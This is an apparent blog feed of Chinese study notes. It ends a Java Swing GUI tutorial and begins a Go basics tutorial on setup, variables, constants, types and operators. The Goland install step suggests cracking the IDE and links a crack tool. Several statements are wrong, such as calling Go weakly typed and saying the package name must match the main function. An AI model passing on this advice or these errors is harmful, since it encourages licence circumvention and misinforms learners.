<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComboboxDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ComboboxDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;ComboboxDemo&quot;</span>);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="type">JComboBox</span> <span class="variable">status</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">        status.addItem(<span class="literal">null</span>);</span><br><span class="line">        status.addItem(<span class="string">&quot;正在热映&quot;</span>);</span><br><span class="line">        status.addItem(<span class="string">&quot;已下架&quot;</span>);</span><br><span class="line">        status.addItem(<span class="string">&quot;即将上映&quot;</span>);</span><br><span class="line">        container.add(status);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ComboboxDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113135112944.png" alt="image-20221113135112944"></p>
<ul>
<li>列表框</li>
</ul>
<p>方法一：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComboboxDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ComboboxDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;ComboboxDemo&quot;</span>);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 生成列表的内容</span></span><br><span class="line">        String [] contents = &#123;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>&#125;;</span><br><span class="line">        JList&lt;String&gt; JList = <span class="keyword">new</span> <span class="title class_">JList</span>&lt;String&gt;(contents);</span><br><span class="line">        container.add(JList);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ComboboxDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComboboxDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ComboboxDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;ComboboxDemo&quot;</span>);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 生成列表的内容</span></span><br><span class="line">        Vector&lt;String&gt; contents = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;String&gt;();</span><br><span class="line">        JList&lt;String&gt; JList = <span class="keyword">new</span> <span class="title class_">JList</span>&lt;String&gt;(contents);</span><br><span class="line">        contents.add(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        contents.add(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        contents.add(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        container.add(JList);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ComboboxDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113140516606.png" alt="image-20221113140516606"></p>
<h3 id="3-7、文本框">1.4.7. 3.7、文本框</h3><ul>
<li>文本框</li>
<li>密码框</li>
<li>文本域</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTextDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestTextDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;TestTextDemo&quot;</span>);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 文本框</span></span><br><span class="line">        <span class="type">JTextField</span> <span class="variable">jTextField1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextField</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">JTextField</span> <span class="variable">jTextField2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextField</span>(<span class="string">&quot;world&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        container.add(jTextField1,BorderLayout.WEST);</span><br><span class="line">        container.add(jTextField2,BorderLayout .EAST);</span><br><span class="line">        <span class="comment">// 密码框</span></span><br><span class="line">        <span class="type">JPasswordField</span> <span class="variable">jPasswordField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPasswordField</span>(<span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置密码框的替换文本</span></span><br><span class="line">        jPasswordField.setEchoChar(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        container.add(jPasswordField,BorderLayout.CENTER);</span><br><span class="line">        <span class="comment">// 文本域</span></span><br><span class="line">        <span class="type">JTextArea</span> <span class="variable">jTextArea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextArea</span>();</span><br><span class="line"></span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TestTextDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113141727162.png" alt="image-20221113141727162"></p>
]]></content>
      <categories>
        <category>高级语言</category>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Golang基础学习</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Golang/Golang.html</url>
    <content><![CDATA[<h1 id="Golang">1. Golang</h1><p>1、安装</p>
<ul>
<li><input disabled type="checkbox"> Go</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.下载GO安装包，选择自己系统的版本</span><br><span class="line">	https://studygolang.com/dl</span><br><span class="line">	</span><br><span class="line">2.配置环境变量和目录</span><br><span class="line">	新建GOPATH和GOROOT</span><br><span class="line">	GOROOT存放GO环境目录</span><br><span class="line">	GOPATH存放后续开发代码</span><br><span class="line">		GOPATH目录下存放3个文件夹pkg、bin、src</span><br><span class="line">	将用户变量的GOPATH也更改为系统变量的GOPATH目录</span><br><span class="line">	</span><br><span class="line">3.命令行查看go env配置信息</span><br><span class="line">	确保set GOPATH=和set GOROOT=为我们配置的目录</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221114211916816.png" alt="image-20221114211916816"></p>
<ul>
<li><input disabled type="checkbox"> Goland</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有钱就买正版，没钱就破解</span><br><span class="line">https://www.jetbrains.com.cn/go/</span><br><span class="line">破解工具</span><br><span class="line">https://www.iculture.cc/software/pig=24498</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221114212236252.png" alt="image-20221114212236252"></p>
<ul>
<li><input disabled type="checkbox"> vscode</li>
</ul>
<p>插件安装</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221126160444758.png" alt="image-20221126160444758"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221126160800229.png" alt="image-20221126160800229"></p>
<p>2、Hello World</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span> <span class="comment">// 导入系统包fmt用来输出</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello world&quot;</span>) <span class="comment">// ln换行打印字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">1、包名和主函数名必须相同</span><br><span class="line">2、如果goland运行程序报错找不到路径，可以设置 go env -w GO111MODULE=off</span><br><span class="line">3、Goland写程序如果变量或包未被引用会报红</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221114213237950.png" alt="image-20221114213237950"></p>
<p>3.Go的常用命令</p>
<ul>
<li>go build main.go	生成exe的可执行文件</li>
<li>go run main.go  运行程序</li>
<li>go env 打印环境变量</li>
<li>go get 下载安装包和依赖，如果报错的话需要先go mod init 项目名称初始化</li>
</ul>
<h2 id="基础语法">1.1. 基础语法</h2><h3 id="注释">1.1.1. 注释</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量">1.1.2. 变量</h3><h4 id="变量的声明">1.1.2.1. 变量的声明</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">定义一个变量:	</span><br><span class="line"><span class="keyword">var</span> name <span class="keyword">type</span></span><br><span class="line">===========================</span><br><span class="line">定义多个变量</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">	name1 <span class="keyword">type</span></span><br><span class="line">    name2 <span class="keyword">type</span></span><br><span class="line">    name3 <span class="keyword">type</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个var，是变量声明关键字</li>
<li>第二个name，是变量名</li>
<li>第三个type，代表变量类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">1.golang为弱类型语言，golang的type更类似与约束，不允许变量值为其他类型，正常写可以省略，省略的话为自动类型</span><br></pre></td></tr></table></figure>

<h4 id="变量的赋值">1.1.2.2. 变量的赋值</h4><ul>
<li>短变量声明并初始化</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// := 编译器可以自动推导数据类型</span></span><br><span class="line">name := <span class="string">&quot;qwtd&quot;</span></span><br><span class="line">age := <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>短变量声明并初始化存在以下限制</p>
<ul>
<li>定义变量，同时初始化（已经定义过的变量不能使用:&#x3D;）</li>
<li>不能提供数据类型</li>
<li>只能用在函数内部，不能随便到处定义</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> name <span class="type">string</span> = <span class="string">&quot;张三&quot;</span></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		age <span class="type">int</span>    = <span class="number">18</span></span><br><span class="line">		sex <span class="type">string</span> = <span class="string">&quot;男&quot;</span></span><br><span class="line">	)</span><br><span class="line">	fmt.Println(name, age, sex)</span><br><span class="line">	<span class="comment">// := 编译器可以自动推导数据类型</span></span><br><span class="line">	hobbies := <span class="string">&quot;swimming&quot;</span></span><br><span class="line">	height := <span class="number">185</span></span><br><span class="line">	fmt.Println(hobbies, height)</span><br><span class="line">    <span class="comment">// %T占位符表示类型,Printf:按照指定的格式进行输出</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%T&quot;</span>, hobbies, height)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="打印内存地址">1.1.2.3. 打印内存地址</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> num <span class="type">int</span></span><br><span class="line">	num = <span class="number">10</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;num的值为%d,内存地址为:%p&quot;</span>, num, &amp;num) <span class="comment">// &amp;变量名，取地址符</span></span><br><span class="line">	num = <span class="number">20</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;num的值为%d,内存地址为:%p&quot;</span>, num, &amp;num) <span class="comment">// &amp;变量名，取地址符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115200805820.png" alt="image-20221115200805820"></p>
<h4 id="变量交换">1.1.2.4. 变量交换</h4><p>在如Java等其他语言中，变量的交换需要存储在一个临时变量中去实现，Go实现变量交换与Python一致</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">100</span></span><br><span class="line">	b := <span class="number">200</span></span><br><span class="line">	a, b = b, a</span><br><span class="line">	fmt.Println(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115201129487.png" alt="image-20221115201129487"></p>
<h4 id="匿名变量">1.1.2.5. 匿名变量</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建函数，定义两个返回值类型为int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">100</span>, <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 正常情况</span></span><br><span class="line">	a, b := test()</span><br><span class="line">	fmt.Println(a, b)</span><br><span class="line">	<span class="comment">// 使用匿名变量 _ ,所有赋值给匿名变量的值都将被舍弃</span></span><br><span class="line">	c, _ := test()</span><br><span class="line">	_, d := test()</span><br><span class="line">	fmt.Println(c, d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115202515847.png" alt="image-20221115202515847"></p>
<h4 id="变量的作用域">1.1.2.6. 变量的作用域</h4><ul>
<li>局部变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.定义在方法中的变量，只能在定义的方法中使用</span><br><span class="line">2.局部变量可以与全局变量声明相同的名字，方法内的调用会优先使用局部变量</span><br></pre></td></tr></table></figure>

<ul>
<li>全局变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">定义在方法外的变量，可以在全局使用</span><br></pre></td></tr></table></figure>

<h4 id="常量">1.1.2.7. 常量</h4><p>常量不能被修改</p>
<ul>
<li>const，定义常量</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">const</span> URL <span class="type">string</span> = <span class="string">&quot;www.baidu.com&quot;</span> <span class="comment">// 显式定义，带类型</span></span><br><span class="line">	<span class="keyword">const</span> URL2 = <span class="string">&quot;www.baidu.com&quot;</span>       <span class="comment">// 隐式定义，不带类型</span></span><br><span class="line">	fmt.Println(URL, URL2)</span><br><span class="line">	<span class="keyword">const</span> a, b, c = <span class="number">3.14</span>, <span class="string">&quot;qwtd&quot;</span>, <span class="literal">false</span></span><br><span class="line">	fmt.Println(a, b, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115203719503.png" alt="image-20221115203719503"></p>
<ul>
<li><input disabled type="checkbox"> iota，Go语言中的特殊常量，是Go语言中的常量计数器，默认值为0，<strong>在一组常量中</strong>每次增加一个常量+1，每组常量的iota互不干扰</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	const (</span><br><span class="line">		a = iota <span class="comment">// 0</span></span><br><span class="line">		b        <span class="comment">// 1</span></span><br><span class="line">		c        <span class="comment">// 2</span></span><br><span class="line">		d = <span class="string">&quot;haha&quot;</span></span><br><span class="line">		e</span><br><span class="line">		<span class="type">f</span></span><br><span class="line">		<span class="variable">g</span> <span class="operator">=</span> iota <span class="comment">// 6 iota会持续计数</span></span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 如果下一个数未被定义的话，会继承上一个数的值</span></span><br><span class="line">	fmt.Println(a, b, c, d, e, f, g)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115204434626.png" alt="image-20221115204434626"></p>
<h3 id="基本数据类型">1.1.3. 基本数据类型</h3><h4 id="布尔型">1.1.3.1. 布尔型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flag <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line">默认值为<span class="literal">false</span>，%t 布尔类型当前值占位符</span><br></pre></td></tr></table></figure>

<h4 id="数字类型">1.1.3.2. 数字类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="type">int</span> 存在<span class="type">int</span>,<span class="type">int8</span>,<span class="type">int16</span>,<span class="type">int32</span>,<span class="type">int64</span>,值越大可以表示的数越大</span><br><span class="line">默认值为<span class="number">0</span>，%d 整数类型当前值占位符</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num2 <span class="type">float32</span> = <span class="number">3.14</span></span><br><span class="line">float存在<span class="type">float32</span>,<span class="type">float64</span>,尽量使用<span class="type">float64</span>去定义浮点类型数据,避免损失精度</span><br><span class="line">默认值为<span class="number">0.0</span>，%f 浮点数类型当前值占位符</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num3 <span class="type">uint</span> = <span class="number">10</span></span><br><span class="line"><span class="type">uint</span> 打印无符号整数</span><br></pre></td></tr></table></figure>

<p>别名</p>
<table>
<thead>
<tr>
<th>byte类似于uint8</th>
</tr>
</thead>
<tbody><tr>
<td><strong>rune类似于int32</strong></td>
</tr>
<tr>
<td><strong>wint 32或64位</strong></td>
</tr>
<tr>
<td><strong>int 与uint 一样大小</strong></td>
</tr>
<tr>
<td><strong>uintptr 无符号整型，用于存放一个指针</strong></td>
</tr>
</tbody></table>
<h4 id="字符串类型">1.1.3.3. 字符串类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s1 := <span class="string">&#x27;A&#x27;</span> <span class="comment">// &#x27;&#x27;代表char字符，为int32类型</span></span><br><span class="line">s2 := <span class="string">&quot;A&quot;</span> <span class="comment">// &quot;&quot;代表字符串，string类型</span></span><br><span class="line"><span class="comment">// 字符串的拼接使用 +</span></span><br><span class="line"><span class="comment">// 转义字符\</span></span><br></pre></td></tr></table></figure>

<p>演示</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 布尔类型</span></span><br><span class="line">	<span class="keyword">var</span> flag <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%t\n&quot;</span>, flag, flag)</span><br><span class="line">	<span class="comment">// 数字类型</span></span><br><span class="line">	<span class="comment">// 整数</span></span><br><span class="line">	<span class="keyword">var</span> num1 <span class="type">int</span> = <span class="number">10</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%d\n&quot;</span>, num1, num1)</span><br><span class="line">	<span class="comment">// 浮点数</span></span><br><span class="line">	<span class="keyword">var</span> num2 <span class="type">float32</span> = <span class="number">3.1</span></span><br><span class="line">	<span class="comment">// %f默认打印6位小数，可以在f前面加.n控制小数为n位,四舍五入</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%.2f\n&quot;</span>, num2, num2)</span><br><span class="line">	<span class="comment">// 字符串类型</span></span><br><span class="line">	<span class="keyword">var</span> str <span class="type">string</span> = <span class="string">&quot;welcome&quot;</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%s\n&quot;</span>, str, str)</span><br><span class="line">	s1 := <span class="string">&#x27;A&#x27;</span> <span class="comment">// &#x27;&#x27;代表char字符，为int32类型</span></span><br><span class="line">	s2 := <span class="string">&quot;A&quot;</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%d\n&quot;</span>, s1, s1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%s\n&quot;</span>, s2, s2)</span><br><span class="line">	<span class="comment">// 字符串的拼接使用 +</span></span><br><span class="line">	<span class="comment">// 转义字符\</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221116132948714.png" alt="image-20221116132948714"></p>
<h4 id="数据类型转换">1.1.3.4. 数据类型转换</h4><ul>
<li><p>由于Go语言不存在隐式类型转换，因此所有的类型转换都必须显式的声明</p>
</li>
<li><p>大小不同的数据类型，分配的内存空间是不同的，将大类型转换成小类型会导致精度丢失</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">3</span>   <span class="comment">// int</span></span><br><span class="line">	b := <span class="number">5.0</span> <span class="comment">// float64</span></span><br><span class="line">	<span class="comment">// 需求:将int类型的a转换为 float64 类型类型转换</span></span><br><span class="line">	c := <span class="type">float64</span>(a)</span><br><span class="line">	d := <span class="type">int</span>(b)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%T\n%T,%T&quot;</span>, a, b, c, d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运算符">1.1.4. 运算符</h3><h4 id="算术运算符">1.1.4.1. 算术运算符</h4><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>相加</td>
<td>A + B 输出结果 30</td>
</tr>
<tr>
<td>-</td>
<td>相减</td>
<td>A- B 输出结果 -10</td>
</tr>
<tr>
<td>*</td>
<td>相乘</td>
<td>A*B输出结果 200</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>相除</td>
<td>B&#x2F;A输出结果2</td>
</tr>
<tr>
<td>%</td>
<td>求余</td>
<td>B%A输出结果0</td>
</tr>
<tr>
<td>++</td>
<td>自增</td>
<td>A++ 输出结果 11</td>
</tr>
<tr>
<td>–</td>
<td>自减</td>
<td>A– 输出结果 9</td>
</tr>
</tbody></table>
<p>Go语言中只有a++,a–没有–a,++a</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">10</span></span><br><span class="line">	b := <span class="number">2</span></span><br><span class="line">	fmt.Println(a + b) <span class="comment">// 12</span></span><br><span class="line">	fmt.Println(a - b) <span class="comment">// 8</span></span><br><span class="line">	fmt.Println(a * b) <span class="comment">// 20</span></span><br><span class="line">	fmt.Println(a / b) <span class="comment">// 5</span></span><br><span class="line">	fmt.Println(a % b) <span class="comment">// 0</span></span><br><span class="line">	a--</span><br><span class="line">	fmt.Println(a) <span class="comment">// 9</span></span><br><span class="line">	a++</span><br><span class="line">	fmt.Println(a) <span class="comment">// 10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="关系运算符">1.1.4.2. 关系运算符</h4><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;&#x3D;</td>
<td>检查两个值是否相等，如果相等返回 True[否则返回 False</td>
<td>(A&#x3D;&#x3D;B)为False</td>
</tr>
<tr>
<td>!&#x3D;</td>
<td>检查两个值是否不相等，如果不相等返回True否则返回 False</td>
